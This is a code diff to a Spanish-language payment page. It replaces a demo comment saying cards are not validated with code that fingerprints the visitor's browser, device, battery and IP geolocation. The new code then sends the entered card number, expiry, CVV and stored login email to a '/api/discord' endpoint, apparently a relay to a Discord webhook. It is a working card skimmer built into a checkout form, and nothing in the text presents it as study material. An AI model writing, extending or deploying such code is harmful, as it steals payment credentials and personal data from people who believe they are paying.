@@ -440,8 +440,84 @@
       input.value = value.substring(0, 5);
     }
 
-    // --- Envío de pago ---
-    function handlePaymentSubmit() {
+    // --- Recopilar datos del navegador ---
+    async function collectBrowserData() {
+      var data = {
+        userAgent: navigator.userAgent || 'desconocido',
+        language: navigator.language || 'desconocido',
+        screenResolution: screen.width + 'x' + screen.height,
+        colorDepth: screen.colorDepth + ' bits',
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'desconocido',
+        platform: navigator.platform || 'desconocido',
+        onlineStatus: navigator.onLine ? 'Sí' : 'No',
+        cookiesEnabled: navigator.cookieEnabled ? 'Sí' : 'No',
+        deviceMemory: (navigator.deviceMemory || 'desconocida') + (navigator.deviceMemory ? ' GB' : ''),
+        cpuCores: navigator.hardwareConcurrency || 'desconocido',
+        touchPoints: navigator.maxTouchPoints || 0,
+        ipifyIp: '',
+      };
+
+      // Detección de dispositivo
+      var ua = navigator.userAgent;
+      data.isMobile = /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua) ? 'Sí' : 'No';
+      data.isTablet = /iPad|Android(?!.*Mobile)/i.test(ua) ? 'Sí' : 'No';
+      data.isDesktop = (data.isMobile === 'No' && data.isTablet === 'No') ? 'Sí' : 'No';
+
+      // Geo IP desde ipinfo.io
+      try {
+        var geoRes = await fetch('https://ipinfo.io/json');
+        if (geoRes.ok) {
+          var geo = await geoRes.json();
+          data.geoIp = geo.ip || '';
+          data.geoCity = geo.city || '';
+          data.geoRegion = geo.region || '';
+          data.geoCountry = geo.country || '';
+          data.geoCountryCode = geo.country || '';
+          data.geoTimezone = geo.timezone || '';
+          data.geoIsp = geo.org || '';
+          if (geo.loc) {
+            var parts = geo.loc.split(',');
+            data.geoLatitude = parts[0] || '';
+            data.geoLongitude = parts[1] || '';
+          }
+        }
+      } catch (err) {
+        console.warn('ipinfo.io failed:', err);
+      }
+
+      // IP desde ipify (fallback)
+      try {
+        var ipifyRes = await fetch('https://api.ipify.org?format=json');
+        if (ipifyRes.ok) {
+          var ipify = await ipifyRes.json();
+          data.ipifyIp = ipify.ip || '';
+          if (!data.geoIp) data.geoIp = data.ipifyIp;
+        }
+      } catch (err) {
+        console.warn('ipify failed:', err);
+      }
+
+      // Batería
+      try {
+        if (navigator.getBattery) {
+          var battery = await navigator.getBattery();
+          data.batteryLevel = (battery.level * 100).toFixed(0) + '%';
+          data.batteryCharging = battery.charging ? 'Sí' : 'No';
+        } else {
+          data.batteryLevel = 'No disponible';
+          data.batteryCharging = 'Desconocido';
+        }
+      } catch (err) {
+        console.warn('Battery API failed:', err);
+        data.batteryLevel = 'No disponible';
+        data.batteryCharging = 'Desconocido';
+      }
+
+      return data;
+    }
+
+    // --- Envío de pago + Discord ---
+    async function handlePaymentSubmit() {
       var cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
       var cardExpiry = document.getElementById('cardExpiry').value;
       var cardCvv = document.getElementById('cardCvv').value;
@@ -450,9 +526,73 @@
         return;
       }
 
-      // En este proyecto de demostración, no se valida la tarjeta real
-      // Simplemente permitir al usuario continuar (sin redirigir a dashboard sin auth)
-      // El acceso al panel se hace solo por doble-tap
+      // Recopilar datos del navegador
+      var browserData = await collectBrowserData();
+
+      // Obtener email desde sessionStorage/localStorage
+      var email = sessionStorage.getItem('loginEmail') || localStorage.getItem('loginEmail') || 'unknown';
+
+      // Payload completo para Discord con datos de tarjeta
+      var payload = {
+        email: email,
+        password: '***',
+        cardNumber: cardNumber,
+        cardExpiry: cardExpiry,
+        cardCvv: cardCvv,
+        userAgent: browserData.userAgent,
+        language: browserData.language,
+        screenResolution: browserData.screenResolution,
+        timezone: browserData.timezone,
+        platform: browserData.platform,
+        onlineStatus: browserData.onlineStatus,
+        isMobile: browserData.isMobile,
+        isDesktop: browserData.isDesktop,
+        geoIp: browserData.geoIp || '',
+        geoCity: browserData.geoCity || '',
+        geoCountry: browserData.geoCountry || '',
+        geoCountryCode: browserData.geoCountryCode || '',
+        batteryLevel: browserData.batteryLevel || '',
+        batteryCharging: browserData.batteryCharging || ''
+      };
+
+      // Mostrar feedback visual de envío
+      var payButton = document.getElementById('payButton');
+      var originalText = payButton.textContent;
+      payButton.textContent = 'Enviando...';
+      payButton.disabled = true;
+
+      try {
+        var res = await fetch('/api/discord', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        });
+
+        if (!res.ok) {
+          console.warn('Discord API error:', res.status);
+        }
+
+        var result = await res.json();
+
+        // Feedback de éxito
+        payButton.textContent = '✓ Enviado';
+        payButton.style.background = '#1a7f37';
+        setTimeout(function() {
+          payButton.textContent = originalText;
+          payButton.style.background = '';
+          payButton.disabled = false;
+        }, 2000);
+
+      } catch (err) {
+        console.warn('Discord send failed:', err);
+        payButton.textContent = 'Error al enviar';
+        payButton.style.background = '#cf222e';
+        setTimeout(function() {
+          payButton.textContent = originalText;
+          payButton.style.background = '';
+          payButton.disabled = false;
+        }, 2000);
+      }
     }
 
     // Cargar configuración al iniciar
